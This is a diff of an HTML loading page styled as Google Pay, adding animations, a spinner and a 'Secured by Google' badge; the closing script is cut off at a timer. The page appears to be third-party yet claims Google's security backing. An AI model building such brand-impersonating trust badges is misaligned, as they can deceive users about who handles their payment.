@@ -2,29 +2,251 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
   <title>Google Pay</title>
-  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{
-      background:#fff;height:100vh;display:flex;flex-direction:column;
-      justify-content:center;align-items:center;font-family:'Google Sans',sans-serif;
-      padding:20px;overflow:hidden;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-    .gpay-logo{width:clamp(100px,30vw,120px);height:auto;
-      animation:fadeIn 0.8s ease-out, pulse 1.5s infinite;}
-    .loading-text{margin-top:25px;font-size:clamp(16px,5vw,18px);color:#5f6368;
-      opacity:0;animation:fadeIn 1s 0.5s forwards;}
-    .status{margin-top:10px;font-size:14px;color:#34a853;opacity:0;animation:fadeIn 1s 1s forwards;}
-    @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
-    @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.05);}}
+    
+    body {
+      background: #fff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      padding: max(20px, env(safe-area-inset-top)) max(20px, env(safe-area-inset-right)) max(20px, env(safe-area-inset-bottom)) max(20px, env(safe-area-inset-left));
+      overflow: hidden;
+      position: relative;
+    }
+    
+    /* Subtle background pattern */
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: radial-gradient(circle at 20% 30%, rgba(66, 133, 244, 0.03) 0%, transparent 50%),
+                  radial-gradient(circle at 80% 70%, rgba(52, 168, 83, 0.03) 0%, transparent 50%);
+      z-index: 0;
+    }
+    
+    .content {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .logo-container {
+      animation: fadeInScale 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      margin-bottom: 30px;
+    }
+    
+    .gpay-logo {
+      width: clamp(120px, 35vw, 160px);
+      height: auto;
+      filter: drop-shadow(0 10px 25px rgba(66, 133, 244, 0.15));
+      animation: logoFloat 3s ease-in-out infinite;
+    }
+    
+    .loading-text {
+      margin-top: 35px;
+      font-size: clamp(18px, 5vw, 22px);
+      color: #5f6368;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.4s forwards;
+      font-weight: 500;
+      text-align: center;
+    }
+    
+    .status {
+      margin-top: 12px;
+      font-size: clamp(14px, 4vw, 16px);
+      color: #34a853;
+      opacity: 0;
+      animation: fadeInUp 0.8s 0.7s forwards;
+      font-weight: 600;
+      text-align: center;
+    }
+    
+    /* Loading spinner */
+    .spinner-container {
+      margin-top: 30px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1s forwards;
+    }
+    
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f0f0f0;
+      border-top: 4px solid #4285f4;
+      border-right: 4px solid #34a853;
+      border-bottom: 4px solid #fbbc04;
+      border-left: 4px solid #ea4335;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    
+    /* Google colors progress dots */
+    .progress-dots {
+      display: flex;
+      gap: 10px;
+      margin-top: 25px;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1.3s forwards;
+    }
+    
+    .dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      animation: dotPulse 1.4s ease-in-out infinite;
+    }
+    
+    .dot:nth-child(1) {
+      background: #4285f4;
+      animation-delay: 0s;
+    }
+    
+    .dot:nth-child(2) {
+      background: #ea4335;
+      animation-delay: 0.2s;
+    }
+    
+    .dot:nth-child(3) {
+      background: #fbbc04;
+      animation-delay: 0.4s;
+    }
+    
+    .dot:nth-child(4) {
+      background: #34a853;
+      animation-delay: 0.6s;
+    }
+    
+    .info-text {
+      margin-top: 35px;
+      font-size: clamp(13px, 3.5vw, 14px);
+      color: #80868b;
+      text-align: center;
+      max-width: 280px;
+      line-height: 1.5;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1.6s forwards;
+    }
+    
+    /* Security badge */
+    .security-badge {
+      position: absolute;
+      bottom: max(30px, env(safe-area-inset-bottom) + 10px);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(52, 168, 83, 0.1);
+      padding: 10px 20px;
+      border-radius: 25px;
+      font-size: 13px;
+      color: #34a853;
+      font-weight: 600;
+      opacity: 0;
+      animation: fadeInUp 0.8s 1.9s forwards;
+    }
+    
+    .security-icon {
+      width: 20px;
+      height: 20px;
+    }
+    
+    @keyframes fadeInScale {
+      from {
+        opacity: 0;
+        transform: scale(0.5);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+    
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    
+    @keyframes logoFloat {
+      0%, 100% {
+        transform: translateY(0px);
+      }
+      50% {
+        transform: translateY(-10px);
+      }
+    }
+    
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+    
+    @keyframes dotPulse {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scale(1.3);
+        opacity: 0.5;
+      }
+    }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_Pay_Logo.svg" alt="Google Pay" class="gpay-logo">
-  <div class="loading-text">Opening Google Pay…</div>
-  <div class="status">Please wait...</div>
+  <div class="content">
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_Pay_Logo.svg" alt="Google Pay" class="gpay-logo">
+    </div>
+    
+    <div class="loading-text">Opening Google Pay…</div>
+    <div class="status">Connecting securely</div>
+    
+    <div class="spinner-container">
+      <div class="spinner"></div>
+    </div>
+    
+    <div class="progress-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+    
+    <div class="info-text">
+      Please wait while we securely connect to your payment provider
+    </div>
+  </div>
+  
+  <div class="security-badge">
+    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+    </svg>
+    <span>Secured by Google</span>
+  </div>
 
   <script>
     setTimeout(() => {
